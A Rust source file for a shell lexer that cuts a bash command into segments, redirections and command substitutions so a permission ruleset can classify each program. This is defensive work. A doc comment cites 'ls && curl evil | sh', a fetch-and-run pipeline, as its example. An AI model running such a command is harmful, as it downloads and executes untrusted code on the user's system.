//! A shell **lexer for classification** — enough of `sh` grammar to see what a
//! `bash` invocation actually runs, and no more.
//!
//! `bash` is one string handed to `sh -c`, so the ruleset cannot match it whole:
//! `ls && curl evil | sh` is three programs, and a rule that matched the leading
//! word would call it a read. This module cuts the string into [`Segment`]s —
//! one per program the shell would run — each carrying its words and its
//! **write redirections** separately, because `echo x > /etc/hosts` writes where
//! `echo` never says it does.
//!
//! It is deliberately *not* a shell. It tracks quoting, backslash escapes, the
//! `; & | && ||` separators, newline, `>`/`>>` targets, and it lifts command
//! substitutions (`` `…` `` and `$(…)`) out as further texts to lex — a
//! substitution is a command, and a command the classifier cannot see is a
//! command that runs unclassified. Everything else (expansions, here-docs,
//! functions, aliases) is left alone, which is safe in one direction only and
//! that is the direction we need: an obscured program does not *match* a rule,
//! and an unmatched segment is open-world.
//!
//! The substitution worklist is capped ([`MAX_TEXTS`]). Hitting the cap emits an
//! [`overflow`](Segment::overflow) segment rather than silently dropping the
//! tail, so a pathologically nested command classifies open-world instead of
//! classifying as whatever its outermost word happened to be.

/// How many texts (the command plus its lifted substitutions) will be lexed
/// before the rest is folded into one unclassifiable segment.
const MAX_TEXTS: usize = 64;

/// The word an [`overflow`](Segment::overflow) segment carries — no program is
/// named it, so it matches no rule and lands open-world by the general path.
const OVERFLOW_WORD: &str = "…";

/// One program the shell would run, as the classifier needs to see it.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Segment {
    /// The segment's words, unquoted — `words[0]` is the program.
    pub words: Vec<String>,
    /// Paths this segment redirects output *into* (`>` and `>>`). Held apart
    /// from `words` because a redirection's write is the segment's write no
    /// matter what the program does.
    pub redirects: Vec<String>,
}

impl Segment {
    /// The cap's stand-in: a segment naming a program no rule can match.
    fn overflow() -> Self {
        Self {
            words: vec![OVERFLOW_WORD.to_owned()],
            redirects: Vec::new(),
        }
    }
}

/// Every segment `command` would run, its command substitutions included.
pub fn segments(command: &str) -> Vec<Segment> {
    let mut out = Vec::new();
    let mut pending = vec![command.to_owned()];
    let mut lexed = 0usize;
    while let Some(text) = pending.pop() {
        lexed += 1;
        if lexed > MAX_TEXTS {
            out.push(Segment::overflow());
            break;
        }
        let (segs, inner) = lex(&text);
        out.extend(segs);
        pending.extend(inner);
    }
    out
}

/// State one `lex` pass threads: the segment being built, the word being built,
/// and whether the next completed word is a redirection target.
#[derive(Default)]
struct Build {
    segs: Vec<Segment>,
    seg: Segment,
    word: String,
    redirect: bool,
}

impl Build {
    /// Complete the current word into the current segment (or its redirect
    /// list). An empty word completes nothing — repeated separators are one.
    fn word_end(&mut self) {
        if self.word.is_empty() {
            return;
        }
        let word = std::mem::take(&mut self.word);
        if std::mem::take(&mut self.redirect) {
            self.seg.redirects.push(word);
        } else {
            self.seg.words.push(word);
        }
    }

    /// Complete the current segment. An empty segment completes nothing.
    fn seg_end(&mut self) {
        self.word_end();
        let seg = std::mem::take(&mut self.seg);
        if !seg.words.is_empty() || !seg.redirects.is_empty() {
            self.segs.push(seg);
        }
    }

    /// Everything lexed, with the tail completed.
    fn finish(mut self) -> Vec<Segment> {
        self.seg_end();
        self.segs
    }
}

/// One text's segments, plus the substitution texts lifted out of it.
fn lex(text: &str) -> (Vec<Segment>, Vec<String>) {
    let mut b = Build::default();
    let mut inner: Vec<String> = Vec::new();
    let mut chars = text.chars().peekable();
    let mut quote: Option<char> = None;
    while let Some(c) = chars.next() {
        // Inside single quotes nothing is special; inside double quotes a
        // substitution still runs, which is exactly the case worth catching.
        if let Some(q) = quote {
            if c == q {
                quote = None;
            } else if q == '"' && c == '$' && chars.peek() == Some(&'(') {
                chars.next();
                inner.push(balanced(&mut chars));
            } else {
                b.word.push(c);
            }
            continue;
        }
        match c {
            '\'' | '"' => quote = Some(c),
            '\\' => {
                if let Some(next) = chars.next() {
                    b.word.push(next);
                }
            }
            '`' => inner.push(until(&mut chars, '`')),
            '$' if chars.peek() == Some(&'(') => {
                chars.next();
                inner.push(balanced(&mut chars));
            }
            '>' => {
                b.word_end();
                if chars.peek() == Some(&'>') {
                    chars.next();
                }
                b.redirect = true;
            }
            '<' | ';' | '&' | '|' | '\n' => b.seg_end(),
            c if c.is_whitespace() => b.word_end(),
            c => b.word.push(c),
        }
    }
    (b.finish(), inner)
}

/// Consume up to (and including) `end`, returning what came before it.
fn until(chars: &mut std::iter::Peekable<std::str::Chars<'_>>, end: char) -> String {
    let mut out = String::new();
    for c in chars.by_ref() {
        if c == end {
            break;
        }
        out.push(c);
    }
    out
}

/// Consume a `$(…)` body, counting nested parentheses, and return it.
fn balanced(chars: &mut std::iter::Peekable<std::str::Chars<'_>>) -> String {
    let mut out = String::new();
    let mut depth = 1usize;
    for c in chars.by_ref() {
        match c {
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    break;
                }
            }
            _ => {}
        }
        out.push(c);
    }
    out
}

#[cfg(test)]
mod tests;
